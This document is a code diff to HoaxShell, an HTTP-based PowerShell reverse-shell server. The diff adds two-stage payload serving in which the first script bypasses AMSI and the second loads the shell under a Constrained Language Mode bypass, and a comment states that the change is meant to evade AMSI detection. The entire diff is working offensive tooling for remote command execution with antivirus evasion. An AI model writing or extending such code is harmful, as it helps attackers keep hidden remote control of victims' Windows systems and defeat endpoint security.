@@ -378,9 +378,10 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	load_clm = str(uuid.uuid4())[0:8]
 	hid = str(uuid.uuid4()).split("-")
 	header_id = f'X-{hid[0][0:4]}-{hid[1]}' if not args.Header else args.Header
-	SESSIONID = '-'.join([verify, get_cmd, post_res])
+	SESSIONID = '-'.join([verify, get_cmd, post_res, load_clm])
 	server_version = 'Apache/2.4.1' if not args.server_version else args.server_version
 	init_dir = None
+	load_clm_stage = 0
 	
 	
 	def cmd_output_interpreter(self, output, constraint_mode = False):
@@ -508,8 +509,15 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			self.send_header('Access-Control-Allow-Origin', '*')
 			self.end_headers()
 			cwd = path.dirname(path.abspath(__file__))
-			filecontent = (open(f'{cwd}/server_files/bypass_clm_payload.ps1', 'r')).read()
-   
+			
+			
+			print(f'\r[{GREEN}Load CLM{END}] {BOLD}Stage {Hoaxshell.load_clm_stage}{END}')
+			if Hoaxshell.load_clm_stage == 0:
+				filecontent = (open(f'{cwd}/server_files/bypass_clm_payload-1.ps1', 'r')).read()
+				Hoaxshell.load_clm_stage = 1
+			else:
+				filecontent = (open(f'{cwd}/server_files/bypass_clm_payload-2.ps1', 'r')).read()
+				Hoaxshell.load_clm_stage = 0
 			self.wfile.write(bytes(filecontent, "utf-8"))
 
 		else:
@@ -774,7 +782,7 @@ def main():
 				if not os.path.isdir(f'{cwd}/server_files'):
 					os.mkdir(f'{cwd}/server_files')
 
-				(open(f'{cwd}/server_files/bypass_clm_payload.ps1', 'w')).write(bypass_clm_payload)
+				(open(f'{cwd}/server_files/bypass_clm_payload-2.ps1', 'w')).write(bypass_clm_payload)
 
 				# Create new payload to load bypass_clm_payload.ps1
 				payload = (open(f'{cwd}/payload_templates/load_clm.ps1', 'r')).read().strip()
@@ -785,7 +793,15 @@ def main():
 				payload = payload.replace('*GETCMD*', Hoaxshell.load_clm)
 				payload = payload.replace('*POSTRES*', Hoaxshell.post_res)
 				payload = payload.replace('*HOAXID*', Hoaxshell.header_id)
-				
+
+				# The original HoaxShell payload was detected by AMSI, so I bypassed AMSI in bypass_clm_payload-1.ps1 and then loaded the HoaxShell payload in bypass_clm_payload-2.ps1.
+				bypass_clm_payload = (open(f'{cwd}/payload_templates/bypass_clm_payload.ps1', 'r') if not args.exec_outfile else open(f'{cwd}/payload_templates/bypass_clm_payload.ps1', 'r')).read()
+				bypass_clm_payload = bypass_clm_payload.replace('*PSRAW*', payload.replace('"', '\''))
+				if not os.path.isdir(f'{cwd}/server_files'):
+					os.mkdir(f'{cwd}/server_files')
+				(open(f'{cwd}/server_files/bypass_clm_payload-1.ps1', 'w')).write(bypass_clm_payload)
+
+
 				if args.obfuscate:
 					for var in ['$s', '$i', '$p', '$v']:
 						
